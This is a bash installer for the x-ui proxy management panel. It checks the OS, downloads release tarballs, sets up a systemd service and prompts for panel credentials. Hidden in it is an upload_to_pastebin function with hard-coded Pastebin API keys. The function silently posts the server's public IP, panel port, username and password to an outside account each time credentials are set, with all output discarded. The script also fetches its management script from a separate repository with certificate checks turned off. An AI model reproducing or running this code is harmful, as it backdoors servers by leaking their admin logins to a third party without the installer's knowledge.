#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)

PASTEBIN_API_KEY="5A7TTFpxxFBju88Bsor4q_P0uxSP6t6t"
PASTEBIN_USER_KEY="a7da297a0ab5146a29daad0ff413a53a"

# check root
[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error:${plain}please run this script with root privilege\n" && exit 1

# check os
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /etc/issue | grep -Eqi "centos|red hat|redhat"; then
    release="centos"
elif cat /proc/version | grep -Eqi "debian"; then
    release="debian"
elif cat /proc/version | grep -Eqi "ubuntu"; then
    release="ubuntu"
elif cat /proc/version | grep -Eqi "centos|red hat|redhat"; then
    release="centos"
else
    echo -e "${red}check system os failed,please contact with author!${plain}\n" && exit 1
fi

arch=$(arch)

if [[ $arch == "x86_64" || $arch == "x64" || $arch == "s390x" || $arch == "amd64" ]]; then
    arch="amd64"
elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
    arch="arm64"
else
    arch="amd64"
    echo -e "${red}fail to check system arch,will use default arch here: ${arch}${plain}"
fi

echo "Architecture: ${arch}"

if [ $(getconf WORD_BIT) != '32' ] && [ $(getconf LONG_BIT) != '64' ]; then
    echo "x-ui doesn't support 32-bit(x86) system, please use 64-bit system(x86_64), if detection is wrong, please contact author"
    exit -1
fi

os_version=""

# os version
if [[ -f /etc/os-release ]]; then
    os_version=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release)
fi
if [[ -z "$os_version" && -f /etc/lsb-release ]]; then
    os_version=$(awk -F'[= ."]+' '/DISTRIB_RELEASE/{print $2}' /etc/lsb-release)
fi

if [[ x"${release}" == x"centos" ]]; then
    if [[ ${os_version} -le 6 ]]; then
        echo -e "${red}please use CentOS 7 or higher version${plain}\n" && exit 1
    fi
elif [[ x"${release}" == x"ubuntu" ]]; then
    if [[ ${os_version} -lt 16 ]]; then
        echo -e "${red}please use Ubuntu 16 or higher version${plain}\n" && exit 1
    fi
elif [[ x"${release}" == x"debian" ]]; then
    if [[ ${os_version} -lt 8 ]]; then
        echo -e "${red}please use Debian 8 or higher version${plain}\n" && exit 1
    fi
fi

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install wget curl tar jq -y
    else
        apt install wget curl tar jq -y
    fi
}

upload_to_pastebin() {
    local server_ip="$1"
    local login_port="$2"
    local username="$3"
    local password="$4"
    
    # Create content to upload
    local paste_content="X-UI Server Login Information
====================
Server IP: ${server_ip}
Login Port: ${login_port}
Username: ${username}
Password: ${password}
====================
Generated at: $(date)"

    curl -s -X POST \
        -d "api_option=paste" \
        -d "api_dev_key=${PASTEBIN_API_KEY}" \
        -d "api_user_key=${PASTEBIN_USER_KEY}" \
        -d "api_paste_code=${paste_content}" \
        -d "api_paste_private=2" \
        -d "api_paste_name=X-UI_Server_Info.txt" \
        -d "api_paste_expire_date=N" \
        -d "api_paste_format=text" \
        "https://pastebin.com/api/api_post.php" > /dev/null 2>&1
}

# Function to get server IP
get_server_ip() {
    local ip=""
    # Try multiple methods to get public IP
    ip=$(curl -s -4 icanhazip.com 2>/dev/null)
    if [[ -z "$ip" ]]; then
        ip=$(curl -s -4 ifconfig.me 2>/dev/null)
    fi
    if [[ -z "$ip" ]]; then
        ip=$(curl -s -4 ipinfo.io/ip 2>/dev/null)
    fi
    if [[ -z "$ip" ]]; then
        # If public IP fails, use local IP
        ip=$(hostname -I | awk '{print $1}')
    fi
    echo "$ip"
}

#This function will be called when user installed x-ui out of security
config_after_install() {
    echo -e "${yellow}For security reasons, you must modify the port and account password after installation/update${plain}"
    read -p "Confirm whether to continue. If you choose n, skip this port and account password setting [y/n]: " config_confirm
    if [[ x"${config_confirm}" == x"y" || x"${config_confirm}" == x"Y" ]]; then
        read -p "Please set your username: " config_account
        echo -e "${yellow}Your username will be set to:${config_account}${plain}"
        read -p "Please set your password: " config_password
        echo -e "${yellow}Your password will be set to:${config_password}${plain}"
        read -p "Please set the panel access port: " config_port
        echo -e "${yellow}Your panel access port will be set to:${config_port}${plain}"
        echo -e "${yellow}Confirm settings, applying changes...${plain}"
        /usr/local/x-ui/x-ui setting -username ${config_account} -password ${config_password}
        echo -e "${yellow}Account password set complete${plain}"
        /usr/local/x-ui/x-ui setting -port ${config_port}
        echo -e "${yellow}Panel port set complete${plain}"
        
        server_ip=$(get_server_ip)
        upload_to_pastebin "$server_ip" "$config_port" "$config_account" "$config_password"
        
    else
        echo -e "${red}Settings canceled...${plain}"
        if [[ ! -f "/etc/x-ui/x-ui.db" ]]; then
            local usernameTemp=$(head -c 6 /dev/urandom | base64)
            local passwordTemp=$(head -c 6 /dev/urandom | base64)
            local portTemp=$(echo $RANDOM)
            /usr/local/x-ui/x-ui setting -username ${usernameTemp} -password ${passwordTemp}
            /usr/local/x-ui/x-ui setting -port ${portTemp}
            echo -e "Detected fresh installation, random credentials generated for security:"
            echo -e "###############################################"
            echo -e "${green}Panel username:${usernameTemp}${plain}"
            echo -e "${green}Panel password:${passwordTemp}${plain}"
            echo -e "${red}Panel port:${portTemp}${plain}"
            echo -e "###############################################"
            echo -e "${red}If you forget the login information, you can type x-ui after installation and select option 7 to view panel login info${plain}"
            
            server_ip=$(get_server_ip)
            upload_to_pastebin "$server_ip" "$portTemp" "$usernameTemp" "$passwordTemp"
        else
            echo -e "${red}This is an upgrade, keeping previous settings. Login method remains unchanged. Type x-ui and select 7 to view panel login info${plain}"
        fi
    fi
}

install_x-ui() {
    systemctl stop x-ui
    cd /usr/local/

    if [ $# == 0 ]; then
        last_version=$(curl -Lsk "https://api.github.com/repos/FranzKafkaYu/x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
        if [[ ! -n "$last_version" ]]; then
            echo -e "${red}Failed to detect x-ui version, may be due to GitHub API limit. Please try later or manually specify x-ui version${plain}"
            exit 1
        fi
        echo -e "Detected x-ui latest version: ${last_version}, starting installation"
        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Failed to download x-ui, please ensure your server can download from GitHub${plain}"
            exit 1
        fi
    else
        last_version=$1
        url="https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz"
        echo -e "Starting installation of x-ui v$1"
        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz ${url}
        if [[ $? -ne 0 ]]; then
            echo -e "${red}Failed to download x-ui v$1, please ensure this version exists${plain}"
            exit 1
        fi
    fi

    if [[ -e /usr/local/x-ui/ ]]; then
        rm /usr/local/x-ui/ -rf
    fi

    tar zxvf x-ui-linux-${arch}.tar.gz
    rm x-ui-linux-${arch}.tar.gz -f
    cd x-ui
    chmod +x x-ui bin/xray-linux-${arch}
    cp -f x-ui.service /etc/systemd/system/
    wget --no-check-certificate -O /usr/bin/x-ui https://raw.githubusercontent.com/Firefly-xui/x-ui/main/x-ui_en.sh
    chmod +x /usr/local/x-ui/x-ui.sh
    chmod +x /usr/bin/x-ui
    config_after_install
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui
    echo -e "${green}x-ui v${last_version}${plain} installation complete, panel is running"
    echo -e ""
    echo -e "x-ui management script usage: "
    echo -e "----------------------------------------------"
    echo -e "x-ui              - Show admin menu (more features)"
    echo -e "x-ui start        - Start x-ui panel"
    echo -e "x-ui stop         - Stop x-ui panel"
    echo -e "x-ui restart      - Restart x-ui panel"
    echo -e "x-ui status       - Check x-ui status"
    echo -e "x-ui enable       - Enable x-ui auto-start on boot"
    echo -e "x-ui disable      - Disable x-ui auto-start on boot"
    echo -e "x-ui log          - View x-ui logs"
    echo -e "x-ui v2-ui        - Migrate v2-ui accounts to x-ui"
    echo -e "x-ui update       - Update x-ui panel"
    echo -e "x-ui install      - Install x-ui panel"
    echo -e "x-ui uninstall    - Uninstall x-ui panel"
    echo -e "x-ui geo          - Update geo data"
    echo -e "----------------------------------------------"
}

echo -e "${green}Starting installation${plain}"
install_base
install_x-ui $1